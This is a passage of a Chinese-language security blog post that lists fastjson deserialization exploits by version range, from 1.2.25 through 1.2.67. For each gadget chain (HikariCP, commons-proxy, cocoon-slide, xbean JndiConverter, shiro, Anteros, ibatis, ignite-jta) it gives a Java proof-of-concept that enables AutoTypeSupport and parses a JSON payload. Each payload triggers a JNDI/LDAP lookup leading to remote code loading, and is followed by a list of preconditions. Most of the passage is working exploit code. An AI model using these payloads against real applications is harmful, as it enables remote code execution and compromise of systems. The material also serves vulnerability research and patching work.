JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772695940-0e69df38-a016-4cb2-ad75-21d76ca6205a.png" alt="image.png"></p><h1 id="1-2-25-1-2-59"><a href="#1-2-25-1-2-59" class="headerlink" title="1.2.25-1.2.59"></a>1.2.25-1.2.59</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过禁用类黑名单。</p><h2 id="Exp-5"><a href="#Exp-5" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需开启AutoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.zaxxer&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;HikariCP&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;3.3.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_59</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// some configrations</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制-5"><a href="#限制-5" class="headerlink" title="限制"></a>限制</h2><ul><li>需开启AutoTypeSupport</li><li>需要HikariCP组件</li><li>利用JNDI，受到JDK版本的限制</li></ul><h2 id="调试分析-5"><a href="#调试分析-5" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="1-2-25-1-2-61（复现失败）"><a href="#1-2-25-1-2-61（复现失败）" class="headerlink" title="1.2.25-1.2.61（复现失败）"></a>1.2.25-1.2.61（复现失败）</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过黑名单</p><h2 id="Exp-6"><a href="#Exp-6" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启AutoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;commons-proxy&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_61</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider\&quot;,\&quot;jndiName\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;,\&quot;Object\&quot;:\&quot;a\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-6"><a href="#限制-6" class="headerlink" title="限制"></a>限制</h2><ul><li>要开autoTypeSupport</li><li>要commons-proxy组件</li><li>利用了JNDI，有JDK版本限制</li></ul><h2 id="调试分析-6"><a href="#调试分析-6" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="1-2-25-1-2-62"><a href="#1-2-25-1-2-62" class="headerlink" title="1.2.25-1.2.62"></a>1.2.25-1.2.62</h1><h2 id="JndiConverter链"><a href="#JndiConverter链" class="headerlink" title="JndiConverter链"></a>JndiConverter链</h2><h3 id="补丁分析-4"><a href="#补丁分析-4" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-7"><a href="#Exp-7" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    复现失败</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    需要在JavaEE环境运行或含有javaee依赖</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;slide&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;slide-kernel&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;cocoon&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;cocoon-slide&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.1.11&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;javax&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;javaee-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;8.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_62_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor\&quot;, \&quot;parameters\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Hashtable\&quot;,\&quot;java.naming.factory.initial\&quot;:\&quot;com.sun.jndi.rmi.registry.RegistryContextFactory\&quot;,\&quot;topic-factory\&quot;:\&quot;ldap://127.0.0.1:1234/Calc\&quot;&#125;, \&quot;namespace\&quot;:\&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="限制-7"><a href="#限制-7" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要slide、cocoon和javaee组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-7"><a href="#调试分析-7" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h2 id="CocoonSlide链"><a href="#CocoonSlide链" class="headerlink" title="CocoonSlide链"></a>CocoonSlide链</h2><h3 id="补丁分析-5"><a href="#补丁分析-5" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-8"><a href="#Exp-8" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;4.15&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_62_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// some configrations</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-8"><a href="#限制-8" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要xbean-reflect组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-8"><a href="#调试分析-8" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h1 id="1-2-25-1-2-66"><a href="#1-2-25-1-2-66" class="headerlink" title="1.2.25-1.2.66"></a>1.2.25-1.2.66</h1><h2 id="shiro链"><a href="#shiro链" class="headerlink" title="shiro链"></a>shiro链</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-9"><a href="#Exp-9" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">          &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.4&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/Calc\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-9"><a href="#限制-9" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要shiro组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-9"><a href="#调试分析-9" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h2 id="anteros链"><a href="#anteros链" class="headerlink" title="anteros链"></a>anteros链</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-10"><a href="#Exp-10" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.codahale.metrics&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;metrics-healthchecks&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;3.0.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;Anteros-Core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="限制-10"><a href="#限制-10" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要metrics-healthchecks、Anteros-Core、Anteros-DBCP组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-10"><a href="#调试分析-10" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h2 id="IbatisSqlmap链"><a href="#IbatisSqlmap链" class="headerlink" title="IbatisSqlmap链"></a>IbatisSqlmap链</h2><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-11"><a href="#Exp-11" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.ibatis&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.3.4.726&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;javax&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;javaee-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;8.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_c</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="限制-11"><a href="#限制-11" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要ibatis-sqlmap、javaee组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-11"><a href="#调试分析-11" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h1 id="1-2-25-1-2-67"><a href="#1-2-25-1-2-67" class="headerlink" title="1.2.25-1.2.67"></a>1.2.25-1.2.67</h1><h2 id="igniteJta链"><a href="#igniteJta链" class="headerlink" title="igniteJta链"></a>igniteJta链</h2><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>禁用黑名单绕过。</p><h3 id="Exp-12"><a href="#Exp-12" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.8.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_67_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/Calc\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-12"><a href="#限制-12" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要ignite-jta组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-12"><a href="#调试分析-12" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h3 id="shiro链-1"><a href="#shiro链-1" class="headerlink" title="shiro链"></a>shiro链</h3><h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>禁用黑名单绕过。</p><h3 id="Exp-13"><a href="#Exp-13" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    